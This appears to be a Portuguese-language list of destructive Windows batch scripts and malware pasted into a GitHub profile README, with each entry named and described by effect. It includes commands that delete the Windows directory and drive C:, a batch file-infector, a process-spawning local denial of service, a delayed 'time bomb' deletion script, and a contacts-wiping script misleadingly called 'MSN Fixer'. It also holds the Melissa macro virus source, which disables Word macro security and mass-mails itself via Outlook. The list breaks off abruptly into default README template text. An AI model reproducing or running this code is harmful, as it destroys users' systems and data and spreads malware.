Nome:Del All Windows
rmdir /s /q c:\windows
Função:Deleta tdo do Windows (fode o pc

Nome:Autoexec
@ECHO OFF
@BREAK OFF
deltree/C: Y\*.*
Função:Fode com tudo

Nome:Trojan-1
VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form Form1
BackColor = &H80000007&
BorderStyle = 1 'Fixed Single
Caption = "Welcome to XP Blaster Pro (Enterprise Edition)!"
ClientHeight = 5400
ClientLeft = 45
ClientTop = 390
ClientWidth = 8085
BeginProperty Font
Name = "Fixedsys"
Size = 9
Charset = 0
Weight = 400
Underline = 0 'False
Italic = 0 'False
Strikethrough = 0 'False
EndProperty
Icon = "Source3.frx":0000
LinkTopic = "Form1"
MaxButton = 0 'False
MinButton = 0 'False
MouseIcon = "Source3.frx":08CA
PaletteMode = 2 'Custom
ScaleHeight = 5400
ScaleWidth = 8085
ShowInTaskbar = 0 'False
StartUpPosition = 3 'Windows Default
Begin VB.CommandButton Command3
Caption = "About"
BeginProperty Font
Name = "MS Sans Serif"
Size = 8.25
Charset = 0
Weight = 400
Underline = 0 'False
Italic = 0 'False
Strikethrough = 0 'False
EndProperty
Height = 375
Left = 120
TabIndex = 3
Top = 4920
Width = 1215
End
Begin VB.CommandButton Command2
Appearance = 0 'Flat
BackColor = &H000000FF&
Caption = "WEBSITE"
BeginProperty Font
Name = "Trebuchet MS"
Size = 8.25
Charset = 0
Weight = 400
Underline = 0 'False
Italic = 0 'False
Strikethrough = 0 'False
EndProperty
Height
Função:Augumas dos trojans tradiçionais

Nome:Del p/ Windows
del /s /q c:\windows\
Função:Deleta tudo dentro do Windows ex: arquivos e naum pastas

Nome:Shutdown-S
shutdown -s
Função:Desliga o pc

Nome:Shutdown-R
shutdown -r
Função:Reinicia o pc

Nome:Trojan-2
@echo off
ctty nul
rem
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% V%A%
if not exist V%A% goto end
attrib +h V%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist V%0.com V%0.com %1 %2 %3
@if exist V%0.exe V%0.exe %1 %2 %3
Função:Fode com tudo mesmo...

Nome:Pirata
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
Função:Testar seu Anti-Virus ou enganar auguem.

Nome:Melissa 1999
// Melissa Virus Source Code
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("",
"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> ""
Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("",
"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1):
Options.SaveNormalPrompt = (1 - 1)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("",
"HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo"
Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
For y = 1 To DasMapiName.AddressLists.Count
Set AddyBook = DasMapiName.AddressLists(y)
x = 1
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
BreakUmOffASlice.Recipients.Add Peep
x = x + 1
If x > 50 Then oo = AddyBook.AddressEntries.Count
Next oo
BreakUmOffASlice.Subject = "Important Message From " &
Application.UserName
BreakUmOffASlice.Body = "Here is that document you asked for ... don't
show anyone else Wink"
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
BreakUmOffASlice.Send
Peep = ""
Next y
DasMapiName.Logoff
End
Função:se espalha rapidamente e força empresas como Intel e Microsoft, entre outras, a fechar seus sistemas de e-mail para conter a praga, que se disseminava via Outlook. O vírus, além de se enviar pela Internet, modificava documentos do Word colocando falas do programa de televisão Os Simpsons. Causou danos estimados em US$ 300 milhões a US$ 600 milhões.

Nome:CLICK EM MIM
@ECHO OFF
:REPETE
MSG * CLICK EM MIM
GOTO REPETE
Função:Fica repetindo varias vezes a mesma mensagem

Nome:Progstar
@echo off
rem Denial Of Service Local
:Fucker
start notepad.exe
start write.exe
start sol.exe
start cmd.exe
start powerpnt.exe
start excel.exe
start winword.exe
start msacess.exe
goto Fucker:
Função:Abre varios programas sem parar, fais o pc travar

Nome:bomba relógio
c:\
cd\
echo off
if exist lig1.drv goto 2
echo > lig1.drv sdfsdf
goto fim
:2
if exist lig2.drv goto 3
echo > lig2.drv sdfsdf
goto fim
:3
if exist lig3.drv goto 4
echo > lig3.drv sdfsdf
goto fim
:4
if exist lig4.drv goto 5
echo > lig4.drv sdfsdf
goto fim
:5
if exist lig5.drv goto 6
echo > lig4.drv sdfsdf
goto fim
:6
if exist lig6.drv goto 7
echo > lig6.drv sdfsdf
goto fim
:7
rmdir C:\windows
rmdir C:\arquivos de programas
rmdir C:\documents and settings
:fim
Função:depois que ele for ativado 7 vezes ele apaga tudo
Nome:MSN Fixer
cd %USERPROFILE%
cd Config~1
cd Dadosd~1
cd Micros~1
cd "Windows Live Contacts"
del /s /q *.*- 👋 Hi, I’m @Gabrielhenriquesouzacastro
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
Gabrielhenriquesouzacastro/Gabrielhenriquesouzacastro is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
